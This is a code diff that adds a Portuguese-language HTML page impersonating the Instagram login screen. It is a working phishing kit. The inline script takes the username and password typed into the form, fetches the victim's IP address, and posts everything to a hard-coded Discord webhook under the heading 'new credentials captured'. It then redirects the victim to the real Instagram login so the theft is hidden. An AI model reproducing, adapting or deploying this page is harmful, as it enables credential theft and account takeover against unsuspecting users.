@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+            color: #262626;
+        }
+        
+        .container {
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 10px 0;
+        }
+        
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .login-form {
+            max-width: 350px;
+            margin: 50px auto;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            text-align: center;
+            border-radius: 1px;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 9px 8px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px;
+            margin: 10px 0;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+        
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+        }
+        
+        .signup {
+            margin-top: 20px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup a {
+            color: #0095f6;
+            font-weight: 600;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .app-download img {
+            height: 40px;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Instagram</div>
+        </div>
+        
+        <div class="login-form">
+            <h2 style="font-weight: 600; font-size: 18px;">Entrar</h2>
+            
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" required>
+                <input type="password" id="password" placeholder="Senha" required>
+                
+                <button type="submit" class="login-btn">Entrar</button>
+            </form>
+            
+            <div class="divider">OU</div>
+            
+            <div class="facebook-login">
+                <a href="#"><i class="fab fa-facebook-square"></i> Entrar com o Facebook</a>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Esqueceu a senha?</a>
+            </div>
+        </div>
+        
+        <div class="signup">
+            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p>Obtenha o aplicativo.</p>
+            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian.png/68006a2bb372.png" alt="App Store">
+            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese-brazilian.png/2f2a0c05b2f3.png" alt="Google Play">
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 Instagram do Meta</p>
+        </div>
+    </div>
+
+    <script>
+        // SEU WEBHOOK DO DISCORD
+        const webhookURL = 'https://discord.com/api/webhooks/1362537209991004294/fkHva2VJOdr7SZ-RlX-AD1B4UqhG6VQlr2UVQ_7uhcvqaaTo3KTezkshFka0ljrvrdkf';
+        
+        // Função para enviar dados para o Discord
+        async function enviarParaDiscord(dados) {
+            try {
+                // Formatar a mensagem para o Discord
+                const mensagem = `
+                🔐 **NOVAS CREDENCIAIS CAPTURADAS** 🔐
+                📧 **Usuário:** ${dados.username || 'Não informado'}
+                🔑 **Senha:** ${dados.password || 'Não informada'}
+                🌍 **IP:** ${dados.ip || 'Não disponível'}
+                📱 **Dispositivo:** ${navigator.userAgent}
+                🕒 **Horário:** ${new Date().toLocaleString('pt-BR')}
+                `;
+                
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: mensagem
+                    }),
+                });
+                
+                if (!response.ok) {
+                    console.error('Falha ao enviar dados para o Discord');
+                }
+            } catch (error) {
+                console.error('Erro ao enviar para o Discord:', error);
+            }
+        }
+        
+        // Obter o IP do usuário
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erro ao obter IP:', error);
+                return 'Não disponível';
+            }
+        }
+        
+        // Manipular o envio do formulário
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const ip = await getIP();
+            
+            // Enviar credenciais para o Discord
+            await enviarParaDiscord({
+                username,
+                password,
+                ip
+            });
+            
+            // Redirecionar para página real do Instagram (opcional)
+            window.location.href = 'https://www.instagram.com/accounts/login/';
+        });
+    </script>
+</body>
+</html>
